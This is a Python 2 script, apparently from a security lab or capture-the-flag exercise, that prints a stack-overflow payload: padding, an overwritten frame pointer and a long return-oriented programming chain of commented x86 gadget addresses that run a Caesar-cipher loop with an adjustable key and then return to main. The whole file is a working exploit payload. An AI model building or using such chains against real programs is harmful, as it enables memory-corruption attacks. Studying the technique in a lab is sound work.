cipher_string_init = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ\n'



########################################################################     VALUE OF KEY CAN BE CHANGED HERE   ######################################################################
GA_key_value = '\x03' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3		# key_value (00000003)
######################################################################################################################################################################################




A_s = ('\x61' * 12 + '\x00' * 3) * 12
junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
ebp = '\x38' * 12 + '\x00' * 3 + '\xcf' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3
GA_ret = '\x0e' * 12 + '\x00' * 3 + '\x90' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3


# edi storing cipher address
GA_pop_edi = '\x6f' * 12 + '\x00' * 3 + '\xb3' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop edi ; ret
cipher_add = '\xe0' * 12 + '\x00' * 3 + '\x6c' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# cipher_address = 080e6cee0

# edx storing 10 
GA_pop_edx_ebx = '\xf9' * 12 + '\x00' * 3 + '\xeb' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# pop edx ; pop ebx ; ret
GA_value_11 = '\x0b' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3			# 0000000b
junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# junk 

# Loop jump on null character
GA_xor_eax_eax = '\x70' * 12 + '\x00' * 3 + '\xfc' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# xor eax, eax ; ret
GA_mov_ecx_eax = '\xb8' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# mov ecx, eax ; mov eax, ecx ; ret
GA_add_cl_byte = '\x25' * 12 + '\x00' * 3 + '\xa3' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# add cl, byte ptr [edi] ; inc edx ; ret
GA_mov_eax_ecx = '\xb0' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# mov eax, ecx ; ret
GA_sub_eax_edx = '\x80' * 12 + '\x00' * 3 + '\xf9' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# sub eax, edx ; ret
GA_pop_eax = '\x4a' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x0b' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop eax ; ret
value_0 = '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3
GA_adc = '\xa4' * 12 + '\x00' * 3 + '\x9c' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# adc cl, cl ; ret
#GA_mov_eax_ecx = '\xb0' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# mov eax, ecx ; ret
GA_neg_eax = '\xbb' * 12 + '\x00' * 3 + '\xcd' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# neg eax ; ret 
GA_xchg_ebp_eax = '\xbe' * 12 + '\x00' * 3 + '\x2a' * 12 + '\x00' * 3 + '\x06' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# xchg ebp, eax ; ret
GA_xchg_edi_eax = '\x28' * 12 + '\x00' * 3 + '\x2d' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# xchg edi, eax ; ret
#GA_pop_edi = '\x6f' * 12 + '\x00' * 3 + '\xb3' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop edi ; ret
GA_offset_loop_end = '\x6c' * 12 + '\x00' * 3 + '\x01' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3		###############
GA_and_ebp_edi = '\x4b' * 12 + '\x00' * 3 + '\xee' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# and ebp, edi ; add esp, 4 ; pop ebx ; pop esi ; ret
#junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# junk
#junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# junk
#junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# junk
#GA_xchg_edi_eax = '\x28' * 12 + '\x00' * 3 + '\x2d' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# xchg edi, eax ; ret
#GA_pop_eax = '\x4a' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x0b' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop eax ; ret
glb_addr = '\xc0' * 12 + '\x00' * 3 + '\x6c' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 +'\x08' * 12 + '\x00' * 3			# 080e6cc0
#GA_mov_ecx_eax = '\xb8' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# mov ecx, eax ; mov eax, ecx ; ret
#GA_xchg_ebp_eax = '\xbe' * 12 + '\x00' * 3 + '\x2a' * 12 + '\x00' * 3 + '\x06' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# xchg ebp, eax ; ret
GA_pop_ebp = '\x59' * 12 + '\x00' * 3 + '\x98' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop ebp ; ret
GA_value_ebp = '\x08' * 12 + '\x00' * 3 + '\xd0' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3
GA_mov_dword_ecx_eax = '\x4d' * 12 + '\x00' * 3 + '\x8b' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3 	# mov dword ptr [ecx], eax ; pop ebx ; ret
#glb_addr = '\xc0' * 12 + '\x00' * 3 + '\x6c' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# 080e6cc0
#GA_xor_eax_eax = '\x70' * 12 + '\x00' * 3 + '\xfc' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# xor eax, eax ; ret	
GA_esp = '\xc1' * 12 + '\x00' * 3 + '\xc3' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# add esp, dword ptr [ebx + eax*4] ; ret
#junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
#junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_pop_ebx = '\x22' * 12 + '\x00' * 3 + '\x90' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_eax_value = '\x50' * 12 + '\x00' * 3 + '\xcf' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3

# Loop jump for char + key > 91
#GA_pop_edx_ebx = '\xf9' * 12 + '\x00' * 3 + '\xeb' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# pop edx ; pop ebx ; ret
GA_value_91 = '\x5b' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3			# 0000005a
#GA_add_cl_byte = '\x25' * 12 + '\x00' * 3 + '\xa3' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# add cl, byte ptr [edi] ; inc edx ; ret
#GA_pop_eax = '\x4a' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x0b' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop eax ; ret
key_addr = '\x94' * 12 + '\x00' * 3 + '\x6a' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# 08036a94
GA_add_eax_ecx = '\x64' * 12 + '\x00' * 3 + '\x0b' * 12 + '\x00' * 3 + '\x07' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3		# add eax, ecx ; ret
#GA_pop_eax = '\x4a' * 12 + '\x00' * 3 + '\x05' * 12 + '\x00' * 3 + '\x0b' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3			# pop eax ; ret

GA_xchg_edx_eax = '\x96' * 12 + '\x00' * 3 + '\x46' * 12 + '\x00' * 3 + '\x07' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_inc_edi = '\x08' * 12 + '\x00' * 3 + '\xb5' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_offset_round = '\x18' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3

GA_mov_byte_edx = '\xc2' * 12 + '\x00' * 3 + '\xda' * 12 + '\x00' * 3 + '\x06' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3

value_26 = '\x1a' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3

offset_sub = '\xf4' * 12 + '\x00' * 3 + '\x01' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3 + '\x00' * 12 + '\x00' * 3

ret_to_main = '\xb7' * 12 + '\x00' * 3 + '\x9e' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x09\x00\x00'

y = cipher_string_init + A_s + junk + junk + ebp + GA_ret + GA_pop_edi + cipher_add + GA_pop_edx_ebx + GA_value_11 + junk + GA_xor_eax_eax + GA_mov_ecx_eax + GA_add_cl_byte + GA_mov_eax_ecx + GA_sub_eax_edx + GA_pop_eax + value_0 + GA_mov_ecx_eax + GA_adc + GA_mov_eax_ecx + GA_neg_eax + GA_xchg_ebp_eax + GA_xchg_edi_eax + GA_pop_edi + GA_offset_loop_end + GA_and_ebp_edi + junk + junk + junk + GA_xchg_edi_eax + GA_pop_eax + glb_addr + GA_mov_ecx_eax + GA_xchg_ebp_eax + GA_pop_ebp + GA_value_ebp + GA_mov_dword_ecx_eax + glb_addr + GA_pop_eax + value_0 + GA_esp 

z = GA_pop_ebx + junk + GA_pop_eax + key_addr + GA_mov_ecx_eax + GA_pop_eax + GA_key_value + GA_mov_dword_ecx_eax + junk + GA_pop_eax + value_0 + GA_mov_ecx_eax + GA_xchg_edi_eax + GA_pop_edi + key_addr + GA_add_cl_byte + GA_xchg_edi_eax + GA_mov_eax_ecx + GA_xchg_ebp_eax + GA_pop_eax + value_0 + GA_mov_ecx_eax + GA_add_cl_byte + GA_xchg_ebp_eax + GA_pop_ebp + junk + GA_add_eax_ecx + GA_mov_ecx_eax + GA_pop_edx_ebx + GA_value_91 +junk + GA_sub_eax_edx + GA_mov_eax_ecx + GA_xchg_edx_eax + GA_pop_eax + value_0 + GA_mov_ecx_eax + GA_adc + GA_mov_eax_ecx + GA_neg_eax + GA_xchg_ebp_eax + GA_xchg_edi_eax + GA_pop_edi + GA_offset_round + GA_and_ebp_edi + junk + junk + junk + GA_xchg_edi_eax + GA_pop_eax + glb_addr + GA_mov_ecx_eax + GA_xchg_ebp_eax + GA_pop_ebp + GA_value_ebp + GA_mov_dword_ecx_eax + glb_addr + GA_pop_eax + value_0 + GA_esp

a1 = GA_xchg_edx_eax + GA_pop_edx_ebx + value_26 + junk + GA_sub_eax_edx + GA_xchg_edx_eax  

a2 = GA_xchg_edx_eax + GA_xchg_ebp_eax + GA_xchg_edi_eax + GA_mov_ecx_eax + GA_xchg_edx_eax + GA_mov_eax_ecx + GA_xchg_edi_eax + GA_xchg_ebp_eax + GA_mov_byte_edx + GA_pop_ebx + junk

a3 = GA_inc_edi + GA_pop_ebx + junk + GA_pop_eax + glb_addr + GA_mov_ecx_eax + GA_pop_eax + offset_sub + GA_neg_eax + GA_mov_dword_ecx_eax + glb_addr + GA_pop_eax + value_0 + GA_esp

end = GA_pop_ebx + junk + GA_pop_eax + glb_addr + GA_mov_ecx_eax + GA_pop_eax + value_0 + GA_mov_dword_ecx_eax + junk + ret_to_main

print y + z + a1 + a2 + a3 + end
